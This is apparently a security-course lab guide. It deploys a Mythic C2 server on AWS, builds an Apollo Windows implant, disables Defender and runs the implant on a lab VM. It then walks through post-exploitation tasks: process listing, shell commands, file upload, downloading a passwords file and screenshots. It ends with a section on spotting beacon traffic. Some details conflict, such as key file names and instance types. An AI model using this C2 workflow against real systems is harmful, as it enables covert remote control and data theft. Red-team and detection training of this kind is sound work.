![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Mythic C2 Framework — AWS Deployment
 
# Ubuntu VM (management) · AWS EC2 (Mythic Server) · Windows VM (target)
 
## In this lab we will
- Deploy a Mythic C2 server on **AWS EC2** using a CloudFormation template
- Install the **Apollo** agent and **HTTP** C2 profile on the EC2 instance
- Generate a working payload that calls back to the EC2 server
- Establish a C2 callback from a Windows target
- Use Mythic's web UI to run post-exploitation tasks (file listing, process listing, shell commands)
- Understand what C2 traffic looks like from the defender's perspective
---
 
## What is Mythic?
 
**Mythic** is a modular C2 (Command and Control) framework. It has three main pieces:
 
- **Mythic Server** — the backend that operators connect to. Runs in Docker.
- **C2 Profiles** — define how agents communicate (HTTP, HTTPS, DNS, etc.)
- **Agents** — the payload that runs on the target machine and calls back to the server.
The most common beginner-friendly agent is **Apollo**, which runs on Windows and communicates over HTTP/HTTPS.
 
> **Why AWS?** Mythic and its Docker containers require ~13 GB of disk space. Rather than straining your local Ubuntu VM, we spin up a dedicated EC2 instance (`t3.large`, 30 GB) via CloudFormation and tear it down when we're done.
 
---
 
## Prerequisites 

>[!NOTE]
>You can finish this part on your personal computer, and doing so **is recommended, since it would spare you the transfer of the key file from the VM to your personal computer.**
>There are, however, instructions on how to move the key pair to your personal computer. 
 
### AWS Account
 
If you do not have an AWS account yet, complete **[ScoutSuite Lab — Phase 1](/Decks/CORE_v3.1/IC/labs/scoutsuite.md)** before continuing. That section walks you through account creation.
 
### SSH Key Pair

- In the AWS Search Bar type **Key Pairs**:

<img width="1224" height="696" alt="image" src="https://github.com/user-attachments/assets/dc363303-122d-4249-81ac-304abd2e20c3" />

- In the corner right corner - click **Create Key Pair**

<img width="1665" height="268" alt="image" src="https://github.com/user-attachments/assets/821bc121-1840-4c6c-95fd-8337b35e4d80" />

- Give the Key a simple name, select **Key Pair Type - RSA** and **Private key file format - .pem**, then click **Create** :

>[!IMPORTANT]
>As long as you delete the key after finishing the lab, the name can be anything. It is recommended however that you name the key **Mythic-key** or something similar.
>Be aware of the fact that **you will be given the .pem file only once.**

<img width="1146" height="655" alt="image" src="https://github.com/user-attachments/assets/7615002a-eb78-4630-9b42-a63986fc6911" />

### 🔑 Securing the SSH Key (havoc-key.pem) : 
 - The *RSA Key* should be in your *Downloads* folder (either on the VM or on your personal computer):
   
 <img width="743" height="251" alt="image" src="https://github.com/user-attachments/assets/9e6d048b-4966-4aa3-9f11-40d3f1dff6f3" />

   We will use the **VM's clipboard** to copy the .pem file. Move the *.pem* file to the **lab directory (~/BnB/Havoc)**
 - To *open or close* the clipboard of the VM press **ctrl+alt+shift** and a small window will pop up: 

 <img width="526" height="826" alt="image" src="https://github.com/user-attachments/assets/9ce6ed1f-9a0a-4e46-80a0-39d65c95b40d" />
 
 - Use **cat** and copy the contents of the file. Make sure to copy the **---BEGIN...---** and **---END...---** parts of the key. 

 <img width="775" height="637" alt="image" src="https://github.com/user-attachments/assets/b3dc24ed-57f2-409f-be29-8ce8cdb1f73d" />

 - Copy the contents of the file using **ctrl+shift+c**, and you will see that when you open your clipboard, the contents of the file will be listed there : 

 <img width="524" height="662" alt="image" src="https://github.com/user-attachments/assets/f104722a-7ed5-417c-aa21-a6a8a83dd6d7" />

Use your cursor to **copy the contents of the VM clipboard with ctrl+a, then ctrl+c**, and paste them into a file on your personal machine. 
>[!NOTE]
>After creating the havoc-key.pem file on your host machine using the Copy-Paste method, you must set the correct file permissions. SSH clients are designed to ignore private keys that are "too readable" by other users on the system. If you skip this step, your connection will be rejected.

Depending on your operating system, this proccess will differ : 

### Option A: Linux / macOS Users

- On Linux / macOS, open a folder of your choosing in the terminal, type **nano havoc-key.pem**, paste the content into a the file, press **ctrl+o, Enter, then ctrl+x**. After that, type:

``` bash
chmod 400 LabKey-1.pem
```

 - You should now see the that **only the root user has reading permission**: 

 <img width="632" height="23" alt="image" src="https://github.com/user-attachments/assets/ba2237a6-b905-4f17-8b58-04a7ddf60725" />

### Option B: Windows Users (PowerShell)
Open a PowerShell terminal in the folder containing your key and run these two commands. This will disable permission inheritance and ensure only your current user profile has access:

```PowerShell
# 1. Disable permission inheritance
icacls "havoc-key.pem" /inheritance:r

# 2. Grant read access only to the current user
icacls "havoc-key.pem" /grant:r "${env:USERNAME}:R"6
```

⚠️ Important Security Note: 
 - These "Strict Permissions" ensure that you are the only one who can read this file. If you attempt to connect and see an error like Permissions 0644 for 'havoc-key.pem' are too open, it means the steps above were not completed successfully.
 
---
 
## Part 1 — Deploy the Mythic Server with CloudFormation

>[!NOTE]
> You can finish this part of the lab **on your personal computer or on the Windows VM**.

- Download the **lab cloudformation configuration script** using [this link](/Decks/CORE_v3.1/C2E/labs/mythic/mythic_cloudformation_config.yaml)

The CloudFormation template (`mythic_cloudformation_config.yaml`) creates:
- An EC2 `t3.large` instance (8 GB RAM, 30 GB gp3 disk) running Ubuntu 22.04
- A Security Group that opens ports **22** (SSH), **80** (agent callbacks), and **7443** (Mythic Web UI)
### Deploy the stack
 
1. Open the **AWS Console** and navigate to **CloudFormation → Stacks → Create stack**.

<img width="1087" height="568" alt="image" src="https://github.com/user-attachments/assets/eaf8154c-340a-4500-8788-20692a5447c5" />
<img width="1893" height="555" alt="image" src="https://github.com/user-attachments/assets/0a310691-692d-48d2-ba29-41b5f2833a16" />

2. Under *Specify template*, choose **Upload a template file** and upload `mythic_cloudformation_config.yaml`.

<img width="1409" height="742" alt="image" src="https://github.com/user-attachments/assets/1227545f-33bf-49f8-9009-e9825de57bbd" />

3. Click **Next** and fill in the parameters:
   - **Stack name** : give the server a simple name (ex : MythicServer)
   - **KeyName** : select your existing key pair from the dropdown.
   - **InstanceType** : leave as `m7i-flex.large` (required for Mythic's Docker workload).

4. Click through the remaining screens and hit **Create stack**.
Wait until the stack status shows `CREATE_COMPLETE` (~2 minutes).

### Grab the outputs

Go to the **Outputs** tab of the newly created stack. Note down:
 
| Output key | What it is |
|---|---|
| `PublicIP` | The EC2 instance's public IP — you will use this everywhere |
| `SSHCommand` | Ready-to-paste SSH command |
| `MythicUI` | Direct link to the Mythic web UI |

<img width="1537" height="391" alt="image" src="https://github.com/user-attachments/assets/599cf2a3-dc19-4fc4-a739-471e63c40cfa" />

---
 
## Part 2 — Connect to the EC2 Instance
 
Open a terminal on your Ubuntu VM and connect using the `SSHCommand` from the Outputs tab:
 
```bash
ssh -i "your_key.pem" ubuntu@<EC2_PUBLIC_IP>
```
 
> Replace `<EC2_PUBLIC_IP>` with the value from the `PublicIP` output. You will use this IP address in every step that follows.

<img width="767" height="686" alt="image" src="https://github.com/user-attachments/assets/6eb52301-7c6e-4d41-92f9-1ae7a05406fe" />

---
 
## Part 3 — Install and Start Mythic on EC2
 
- Once you are inside the EC2 instance, clone the Mythic repository:
 
```bash
cd ~
git clone https://github.com/its-a-feature/Mythic
cd Mythic
```

<img width="736" height="227" alt="image" src="https://github.com/user-attachments/assets/78f67117-b67c-458f-af87-8ef5c9d76ec7" />

- Install the Mythic CLI (since the **Ubuntu AWS EC2** is empty, we need to install **make** and **docker**):
 
```bash
sudo apt update
# Install Make
sudo apt install -y make
# Install Docker
curl -fsSL https://get.docker.com | sudo sh
sudo systemctl enable docker
sudo systemctl start docker
sudo make
```

<img width="805" height="155" alt="image" src="https://github.com/user-attachments/assets/1c55ce97-e101-4e63-91b1-a67ee27d5662" />

- Start Mythic (this pulls all required Docker containers — takes 2–5 minutes the first time):
 
```bash
sudo ./mythic-cli start
```
 
  When it finishes you will see output similar to:
 
```
[*] Mythic services started
[*] Web UI available at: https://0.0.0.0:7443
```

<img width="1574" height="751" alt="image" src="https://github.com/user-attachments/assets/df32d902-2cde-451e-a055-40c7d577ee6f" />

- Get the auto-generated admin password:
 
```bash
sudo ./mythic-cli config get MYTHIC_ADMIN_PASSWORD
```

<img width="955" height="170" alt="image" src="https://github.com/user-attachments/assets/a0b5209b-6c76-4250-90c4-b2272ee61eba" />

- Note down the password. The default username is `mythic_admin`.
 
---
 
## Part 4 — Access the Mythic Web UI
 
- On your Ubuntu VM, open Firefox and go to (use the IP from the CloudFormation output):
 
```
https://<EC2_PUBLIC_IP>:7443
```
 
Accept the self-signed certificate warning (click **Advanced → Accept the Risk and Continue**).

<img width="919" height="734" alt="image" src="https://github.com/user-attachments/assets/42440fcc-e5ab-4226-89ea-f5eddb55c88c" />

Log in with:
- **Username:** `mythic_admin`
- **Password:** (the one you copied above)

<img width="922" height="737" alt="image" src="https://github.com/user-attachments/assets/c20e243a-e84c-46bc-80ed-0ae3887b3f33" />

You will land on the Mythic dashboard. The left sidebar has: Callbacks, Payloads, Files, Operations, and more.
 
---
 
## Part 5 — Install the Apollo Agent and HTTP Profile
 
Back in your SSH session on the EC2 instance, install the **Apollo** Windows agent:
 
```bash
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo
```

Install the **http** C2 profile (the transport layer):
 
```bash
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
```
 
Wait for both to finish — you will see "Successfully installed" messages.

<img width="877" height="245" alt="image" src="https://github.com/user-attachments/assets/fa1129ba-e90c-4a19-b42f-2fa47dad0359" />

Restart Mythic so it picks up the new agent and profile:
 
```bash
sudo ./mythic-cli restart
```

<img width="1836" height="738" alt="image" src="https://github.com/user-attachments/assets/9a84a18b-beb2-4632-b58e-900f8062d86f" />

---
 
## Part 6 — Generate a Payload
 
- In the Mythic web UI, click on the button **Create Your First Payload**:

<img width="1913" height="942" alt="image" src="https://github.com/user-attachments/assets/f5461690-3f1c-4ee3-8b80-366d1674e2c3" />

Walk through the payload builder:
 
1. **Select OS** → Windows
2. **Select Agent** → Apollo
3. Click on the **Start Fresh** button

<img width="1908" height="462" alt="image" src="https://github.com/user-attachments/assets/9efd4668-68c1-4b39-a5c7-dcee18c0943a" />
4. Click **Next**

<img width="959" height="961" alt="image" src="https://github.com/user-attachments/assets/ec84b5e7-eca6-44a3-b2de-97c4570cce01" />

5. In the **Commands Available** column, search and select **ls and screenshot**, then click on **>**. Click *Next*: 

<img width="1135" height="306" alt="image" src="https://github.com/user-attachments/assets/cff4b870-10da-4664-911f-237da87f1091" />
<img width="1130" height="272" alt="image" src="https://github.com/user-attachments/assets/1894a34f-b395-47cf-b44f-8c0e34755a90" />
<img width="1130" height="816" alt="image" src="https://github.com/user-attachments/assets/f912a1c7-15e3-415a-b144-2b9a69bf3002" />


6. **C2 Profile config:**
   - **Callback Host** → enter your EC2 public IP (`<EC2_PUBLIC_IP>`)
   - **Callback Interval** → `5` (seconds between check-ins)
Click **Next** :

<img width="1846" height="972" alt="image" src="https://github.com/user-attachments/assets/cc31f189-d01d-42bf-888d-99f10a966c86" />

8. Click **Create Payload**. Mythic builds the payload in Docker on the EC2 instance. When it finishes, click **Download** — the file will be named something like `apollo.exe`. Your browser downloads it directly from the EC2 server.

- Note your Ubuntu IP. You can find it in the terminal : 

<img width="680" height="89" alt="image" src="https://github.com/user-attachments/assets/7cc699de-e6c9-4aab-ae00-964922b716ca" />

- Transfer `apollo.exe` to your Windows target machine. You can host it from the **Ubuntu VM**:

>[!IMPORTANT]
> If your **RSA Key** is in the downloads folder on the Ubuntu VM, move it to any other folder.

```bash
cd ~/Downloads
python3 -m http.server 8080
```

Then on the Windows machine, open a browser and go to:
 
```
http://<UBUNTU_IP>:8080/apollo.exe
```
 
Download and save the file.

<img width="1337" height="639" alt="image" src="https://github.com/user-attachments/assets/df0b379f-0a25-4519-88f7-f3f9e6d62415" />

---
 
## Part 7 — Execute the Payload on Windows

 >[!NOTE]
> Windows Defender will flag and delete this file. You need to either disable Defender on your lab VM or add an exclusion for the folder where you saved the file. This is expected in a lab environment.
 
Disable Defender on Windows (lab only — do not do this on real machines):
 
Open PowerShell as Administrator and run:
 
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Now run the payload:
 
```powershell
cd Downloads
.\apollo.exe
```
 
Switch back to the Mythic web UI. Under **Callbacks**, you will see a new entry appear within a few seconds. This is the Windows machine calling back to your EC2 C2 server.

<img width="1919" height="684" alt="image" src="https://github.com/user-attachments/assets/9ee48bc7-592e-4d73-97dc-064c7a876f45" />

---
 
## Part 8 — Interact with the Callback
 
Click on the callback row in the UI. A task panel opens at the bottom.

<img width="914" height="994" alt="image" src="https://github.com/user-attachments/assets/f1dfbc1d-e03c-45cb-a118-9f4c857bc371" />
 
### List files
 
```
ls C:\Users
```

<img width="1917" height="994" alt="image" src="https://github.com/user-attachments/assets/2b66c5f4-3328-42b6-b0de-dadb3b5926f3" />

### List running processes
 
```
ps
```

<img width="1864" height="963" alt="image" src="https://github.com/user-attachments/assets/9afac5a4-8430-408c-ba8c-310429761db0" />

You will see a full list of running processes, their PIDs, parent PIDs, and process paths. This is exactly what a threat actor would use to look for AV processes, browsers with saved credentials, or privileged processes to migrate into.
 
### Get current user and hostname
 
```
shell whoami
shell hostname
shell ipconfig
```

<img width="1107" height="442" alt="image" src="https://github.com/user-attachments/assets/4bfc11e5-ee60-4554-80fa-a3b09d39bc5e" />

Each `shell` command runs the argument in `cmd.exe` and returns the output.
 
### Upload a file
 
```
upload
```

<img width="1537" height="790" alt="image" src="https://github.com/user-attachments/assets/2a0e6182-5000-463e-a1e9-6db0b19894ce" />

Mythic will prompt you to select a file from your local machine. The agent receives it and writes it to disk on the Windows target.
 
### Download a file from the target
 
```
download C:\Users\<username>\Desktop\passwords.txt
```

If that file exists, Mythic will pull it back to the EC2 server and it will appear under **Files** in the UI.
 
### Get a screenshot
 
```
screenshot
```

<img width="1803" height="987" alt="image" src="https://github.com/user-attachments/assets/a314e1ed-9f92-47f4-9497-7a5b3c7a815a" />

Apollo captures the current screen of the Windows machine and sends it back. It appears under **Files**.

---
 
## Part 9 — What does this look like on the network?
 
In your SSH session on the EC2 instance, open a second terminal tab and capture traffic on port 80:
 
```bash
sudo apt install -y tshark
sudo tshark -i any -f "port 80" -Y "http"
```
 
You will see regular HTTP GET/POST requests arriving from the Windows machine. The agent is beaconing — calling home every 5 seconds to ask for new tasks.
 
Key things to observe:
- **Regular interval** — real user traffic is not this regular. A beacon every 5 seconds is a detection signal.
- **User-Agent** — Apollo sends a browser-like User-Agent to blend in, but it will always be the same string.
- **POST requests** — when you issue a task, the agent sends results back in a POST. The content is encrypted but the pattern is detectable.
This is exactly what a blue teamer looks for in network logs: consistent beaconing intervals, unusual POST traffic, or a process making HTTP connections that has no business reason to.
 
---
 
## Part 10 — Clean Up
 
**On Windows**, kill the agent process and re-enable Defender:
 
```powershell
Stop-Process -Name apollo -Force
Set-MpPreference -DisableRealtimeMonitoring $false
```
 
**On the EC2 instance** (via SSH), stop Mythic:
 
```bash
cd ~/Mythic
sudo ./mythic-cli stop
```
 
**Delete the CloudFormation stack** to terminate the EC2 instance and avoid ongoing charges:
 
1. In the AWS Console, go to **CloudFormation → Stacks**.
2. Select your Mythic stack.
3. Click **Delete** and confirm.
Wait for the status to reach `DELETE_COMPLETE`. The EC2 instance, security group, and all associated resources are removed.
 
---
 
# Finished?
 
[Back to Card's Main Page](/Decks/CORE_v3.1/C2E/Domain_Fronting_As_C2.md)
